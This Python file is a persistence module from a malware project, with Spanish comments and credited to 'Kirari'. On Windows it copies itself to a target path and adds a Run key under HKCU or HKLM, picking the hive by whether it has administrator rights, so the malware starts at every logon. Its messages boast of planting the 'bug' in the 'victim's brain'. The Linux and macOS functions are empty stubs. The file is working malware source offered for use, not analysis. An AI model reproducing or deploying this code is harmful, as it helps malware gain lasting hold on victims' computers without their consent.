
# MODULO DE PERSISTENCIA -> CREADO POR KIRARI

import os
import sys
import ctypes
import shutil
import tempfile
import subprocess 

from ..config import (NOMBRE_MALWARE,
	                  RUTA_MALWARE_DESTINO,
	                  NOMBRE_REGISTRO_MALWARE)


def windows_persistencia():

	def esAdministrador():
		try:
			return ctypes.windll.shell32.IsUserAnAdmin()
		except:
			return False

	if not os.path.isfile(RUTA_MALWARE_DESTINO):
		shutil.copyfile(sys.argv[0],RUTA_MALWARE_DESTINO)

	if not esAdministrador():
		consulta = 'REG QUERY "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /s'
		insertar = 'REG ADD "HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /t REG_SZ /d "' + RUTA_MALWARE_DESTINO + '"'

	else:
		consulta = 'REG QUERY "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /s'
		insertar = 'REG ADD "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run" /v ' + NOMBRE_REGISTRO_MALWARE + ' /t REG_SZ /d "' + RUTA_MALWARE_DESTINO + '"'


	verficar = subprocess.Popen(consulta,shell=True,stdout=subprocess.PIPE)

	if (bytes(NOMBRE_MALWARE,'utf-8') not in verficar.stdout.read()):
		os.system(insertar)
		return (True," [\033[1;32m+\033[0;39m] Bicho plantado en cerebro victima con exito.")

	else:
		return (True," [\033[1;31mx\033[0;39m] No se ha podido plantar el bicho, debido a que ya existe uno en el cerebro victima.")


def linux_persistencia():
	return (False," [\033[1;31mx\033[0;39m] El bicho no se ha podido plantar en este sistema")

def mac_persistencia():
	return (False," [\033[1;31mx\033[0;39m] El bicho no se ha podido plantar en este sistema")


def activar(plataforma):

	if plataforma=="win":
		proceso,msg = windows_persistencia()
		return proceso,msg

	elif plataforma=="linux":
		proceso,msg = linux_persistencia()
		return proceso,msg

	elif plataforma=="mac":
		proceso,msg = mac_persistencia()
		return proceso,msg

	else:
		return (False," [\033[1;31mx\033[0;39m] El bicho no se ha podido plantar ")
